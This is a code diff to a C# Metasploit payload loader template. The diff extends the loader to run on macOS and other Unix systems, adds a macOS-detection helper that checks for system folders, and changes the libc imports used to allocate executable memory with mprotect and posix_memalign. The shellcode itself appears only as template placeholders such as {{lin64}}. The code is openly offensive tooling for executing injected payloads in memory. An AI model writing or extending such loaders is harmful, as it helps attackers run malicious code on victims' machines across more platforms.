@@ -1,4 +1,5 @@
 using System;
+using System.IO;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Diagnostics;
@@ -12,6 +13,8 @@ namespace MetasploitPayload
 			OperatingSystem os = Environment.OSVersion;
 			bool x86 = IntPtr.Size == 4;
 			byte[][] payload;
+
+			Console.WriteLine(os.Platform.ToString());
 
 			if (args.Length == 0) {
 				Process prc = Process.GetCurrentProcess();
@@ -42,7 +45,7 @@ namespace MetasploitPayload
 						thread.Start();
 						System.Threading.Thread.Sleep(500); 
 					}
-				} else if ((int)os.Platform == 4 || (int)os.Platform == 6 || (int)os.Platform == 128) { //linux
+				} else if ((int)os.Platform == 4 || (int)os.Platform == 6 || (int)os.Platform == 128 || os.Platform == PlatformID.MacOSX || os.Platform == PlatformID.Unix) { //linux
 
 					if (!x86)
 						{{lin64}}
@@ -83,13 +86,36 @@ namespace MetasploitPayload
 			}
         }
 
-        [DllImport("libc.so.6", SetLastError = true)]
+        public static PlatformID RunningPlatform()
+	    {
+	        switch (Environment.OSVersion.Platform)
+	        {
+	            case PlatformID.Unix:
+	                // Well, there are chances MacOSX is reported as Unix instead of MacOSX.
+	                // Instead of platform check, we'll do a feature checks (Mac specific root folders)
+	                if (Directory.Exists("/Applications")
+	                    & Directory.Exists("/System")
+	                    & Directory.Exists("/Users")
+	                    & Directory.Exists("/Volumes"))
+	                    return PlatformID.MacOSX;
+	                else
+	                    return PlatformID.Unix;
+
+	            case PlatformID.MacOSX:
+	                return PlatformID.MacOSX;
+
+	            default:
+	                return Environment.OSVersion.Platform;
+	        }
+	    }
+
+        [DllImport("libc", SetLastError = true)]
         private static extern IntPtr mprotect(IntPtr ptr, IntPtr length, IntPtr protection);
 
-        [DllImport("libc.so.6", SetLastError = true)]
+        [DllImport("libc", SetLastError = true)]
         private static extern IntPtr posix_memalign(ref IntPtr ptr, IntPtr alignment, IntPtr size);
 
-        [DllImport("libc.so.6", SetLastError = true)]
+        [DllImport("libc", SetLastError = true)]
         private static extern void free(IntPtr ptr);
 
         [DllImport("kernel32.dll", SetLastError = true)]
